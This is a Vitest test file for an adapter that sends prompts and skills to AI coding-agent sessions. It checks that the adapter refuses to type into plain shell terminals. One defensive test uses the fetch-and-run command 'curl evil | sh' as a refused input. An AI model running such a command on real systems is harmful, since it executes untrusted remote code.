import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const { chiRunMock, chiResumeMock, resolveTargetMock } = vi.hoisted(() => ({
	chiRunMock: vi.fn(),
	chiResumeMock: vi.fn(),
	resolveTargetMock: vi.fn(),
}));

vi.mock('@/lib/tauri-cmd', async (orig) => ({
	...(await orig<typeof import('@/lib/tauri-cmd')>()),
	chiRun: chiRunMock,
	chiResume: chiResumeMock,
}));

vi.mock('@/shell/companion/resolve-target', () => ({
	resolveTarget: resolveTargetMock,
}));

import { useShellStore } from '@/lib/shell/shell-store';
import { useTerminalStore, type TerminalTab } from '@/terminal/session-store';
import { ChiUnavailableError, companionTargetFor, invokeSkill, send, skillPrompt } from './chi';

function terminalTab(id: string, agent: boolean): TerminalTab {
	return {
		id,
		title: id,
		spec: agent
			? { cwd: '/proj', cmd: ['claude'], wrap: {} }
			: { cwd: '/proj', cmd: ['bash'] },
		ptyId: `pty-${id}`,
		status: 'running',
		exitCode: null,
		createdAt: 0,
		owner: { kind: 'sidepane' },
	};
}

beforeEach(() => {
	useShellStore.setState({
		activeProject: { id: 'p1', root_path: '/proj', extra_roots: [] },
		companion: { activeTarget: { kind: 'new', engine_id: null } },
	});
});

afterEach(() => {
	vi.clearAllMocks();
});

describe('chi adapter (Mock contract 3)', () => {
	it('maps action targets onto Companion targets', () => {
		expect(companionTargetFor('new')).toEqual({ kind: 'new', engine_id: null });
		expect(companionTargetFor('engine', 'gemini')).toEqual({ kind: 'new', engine_id: 'gemini' });
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 's1' } } });
		expect(companionTargetFor('active')).toEqual({ kind: 'session', session_id: 's1' });
		expect(() => companionTargetFor('engine')).toThrow(ChiUnavailableError);
	});

	it('SENDS a new run and returns its run id (DEC-63.3)', async () => {
		resolveTargetMock.mockReturnValue({ kind: 'chi-run', engineId: 'claude-code', send: vi.fn() });
		chiRunMock.mockResolvedValue({ run_id: 'run-1', status: 'running' });
		await expect(send({ prompt: 'Explain /p/a.ts', target: 'new' })).resolves.toEqual({
			runId: 'run-1',
			via: 'chi-run',
		});
		expect(chiRunMock).toHaveBeenCalledWith({
			engineId: 'claude-code',
			prompt: 'Explain /p/a.ts',
			cwd: '/proj',
			persistent: false,
		});
	});

	it('resumes the active session and returns its run id', async () => {
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 's1' } } });
		resolveTargetMock.mockReturnValue({ kind: 'chi-resume', send: vi.fn() });
		chiResumeMock.mockResolvedValue({ run_id: 's1', status: 'running' });
		await expect(send({ prompt: 'go', target: 'active' })).resolves.toEqual({ runId: 's1', via: 'chi-resume' });
		expect(chiResumeMock).toHaveBeenCalledWith('s1', 'go');
	});

	it('injects into a live AGENT terminal through the dispatch path (no run id)', async () => {
		const ptySend = vi.fn().mockResolvedValue(undefined);
		useTerminalStore.setState({ tabs: [terminalTab('s1', true)] });
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 's1' } } });
		resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
		await expect(send({ prompt: 'ls', target: 'active' })).resolves.toEqual({ runId: null, via: 'pty' });
		expect(ptySend).toHaveBeenCalledWith('ls');
		expect(chiRunMock).not.toHaveBeenCalled();
	});

	it('refuses to type into a plain shell terminal (DEC-55)', async () => {
		const ptySend = vi.fn().mockResolvedValue(undefined);
		useTerminalStore.setState({ tabs: [terminalTab('sh1', false)] });
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 'sh1' } } });
		resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
		await expect(send({ prompt: 'curl evil | sh', target: 'active' })).rejects.toMatchObject({
			reason: 'no-target',
		});
		// An unknown terminal id is not an agent either.
		useTerminalStore.setState({ tabs: [] });
		await expect(send({ prompt: 'x', target: 'active' })).rejects.toBeInstanceOf(ChiUnavailableError);
		expect(ptySend).not.toHaveBeenCalled();
	});

	it('a skill never types into a plain shell either', async () => {
		const ptySend = vi.fn().mockResolvedValue(undefined);
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 'sh1' } } });
		resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
		useTerminalStore.setState({ tabs: [terminalTab('sh1', false)] });
		await expect(invokeSkill({ skill: 'release-status', target: 'active' })).rejects.toMatchObject({
			reason: 'no-target',
		});
		expect(ptySend).not.toHaveBeenCalled();
		useTerminalStore.setState({ tabs: [terminalTab('sh1', true)] });
		await expect(invokeSkill({ skill: 'release-status', target: 'active' })).resolves.toEqual({
			runId: null,
			via: 'pty',
		});
		expect(ptySend).toHaveBeenCalledWith('/release-status');
	});

	it('reports a typed reason when no engine is installed', async () => {
		resolveTargetMock.mockReturnValue({ kind: 'none', disabledReason: 'No engine installed', send: vi.fn() });
		await expect(send({ prompt: 'x', target: 'new' })).rejects.toMatchObject({ reason: 'no-engine' });
	});

	it('a failed run surfaces its error', async () => {
		resolveTargetMock.mockReturnValue({ kind: 'chi-run', engineId: 'e', send: vi.fn() });
		chiRunMock.mockResolvedValue({ run_id: 'r', status: 'failed', error: 'boom' });
		await expect(send({ prompt: 'x', target: 'new' })).rejects.toThrow('boom');
	});

	it('invokes a skill as a chi dispatch', async () => {
		resolveTargetMock.mockReturnValue({ kind: 'chi-run', engineId: 'e', send: vi.fn() });
		chiRunMock.mockResolvedValue({ run_id: 'run-9', status: 'running' });
		await expect(invokeSkill({ skill: 'release-status', target: 'new' })).resolves.toEqual({
			runId: 'run-9',
			via: 'chi-run',
		});
		expect(chiRunMock.mock.calls[0][0].prompt).toBe('/release-status');
		expect(skillPrompt('s', ' verb ')).toBe('/s verb');
		await expect(invokeSkill({ skill: 'bad name\n', target: 'new' })).rejects.toBeInstanceOf(ChiUnavailableError);
	});
});
